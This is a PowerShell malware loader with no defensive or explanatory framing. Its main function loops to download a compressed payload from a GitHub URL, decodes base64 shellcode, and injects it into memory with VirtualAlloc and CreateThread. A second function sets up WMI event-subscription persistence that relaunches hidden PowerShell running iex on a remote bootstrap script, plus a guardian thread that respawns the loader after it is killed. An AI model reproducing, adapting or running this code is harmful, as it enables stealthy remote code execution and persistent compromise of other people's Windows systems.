# === IMMORTAL LOADER FIX ===
function Invoke-PhantomLoader {
    $url = "https://github.com/mitasahi/root/raw/refs/heads/main/ps-persist.ps1.tar.gz"
    $arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
    
    # Eternal resurrection loop
    while($true) {
        try {
            # Memory download with timeout
            $web = New-Object Net.WebClient
            $web.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.1')
            $tarData = $web.DownloadData($url)
            
            # In-memory extraction
            $ms = New-Object IO.MemoryStream(,$tarData)
            $gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
            $msOutput = New-Object IO.MemoryStream
            $gz.CopyTo($msOutput)
            $rawBytes = $msOutput.ToArray()
            $scBase64 = [Text.Encoding]::UTF8.GetString($rawBytes).Split("|") | 
                        Where-Object { $_ -match "$arch|global" } |
                        Select-Object -Index 0
            [byte[]]$sc = [Convert]::FromBase64String($scBase64)

            # Memory injection with validation
            $code = @"
                using System;
                using System.Runtime.InteropServices;
                public class Inject {
                    [DllImport("kernel32")] 
                    public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);
                    [DllImport("kernel32")] 
                    public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
                    [DllImport("kernel32")] 
                    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
                }
"@
            Add-Type $code -WarningAction SilentlyContinue | Out-Null
            $mem = [Inject]::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x40)
            [Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
            $hThread = [Inject]::CreateThread(0, 0, $mem, 0, 0, 0)
            
            # Keep thread alive (INFINITE wait)
            [Inject]::WaitForSingleObject($hThread, 0xFFFFFFFF) | Out-Null

            # Re-arm persistence
            Initialize-Phoenix
        }
        catch {
            # Stealthy error recovery
            Start-Sleep -Seconds (Get-Random -Minimum 55 -Maximum 65)
        }
        finally { 
            # Memory cleanup
            if ($web) { $web.Dispose() }
            if ($ms) { $ms.Dispose() }
            if ($gz) { $gz.Dispose() }
            [GC]::Collect()
        }
    }
}

# Anti-kill guardian
function Initialize-Phoenix {
    # WMI persistence
    $filterQuery = @"
        SELECT * FROM __InstanceModificationEvent 
        WITHIN 60 WHERE 
        TargetInstance ISA 'Win32_Process' AND 
        TargetState = 3 AND  # Process termination
        TargetInstance.Name = 'powershell.exe'
"@

    $consumerCommand = @"
        cmd /c start /min powershell -Window Hidden -Exec Bypass -C "& { 
            Start-Sleep 30; 
            iex (irm 'https://github.com/mitasahi/root/raw/main/bootstrap.ps1' -UseBasicParsing)
        }"
"@

    # Create permanent subscription
    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
        Name = "ProcessDeathMonitor"
        Query = $filterQuery
        QueryLanguage = "WQL"
    }

    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
        Name = "ProcessResurrector"
        CommandLineTemplate = $consumerCommand
    }

    $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
        Filter = $filter
        Consumer = $consumer
    }

    # Process guardian thread
    Start-ThreadJob -ScriptBlock {
        while($true) {
            if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
                Start-Process powershell.exe -ArgumentList "-NoP -C Invoke-PhantomLoader"
            }
            Start-Sleep 10
        }
    } | Out-Null
}

# Execute
Invoke-PhantomLoader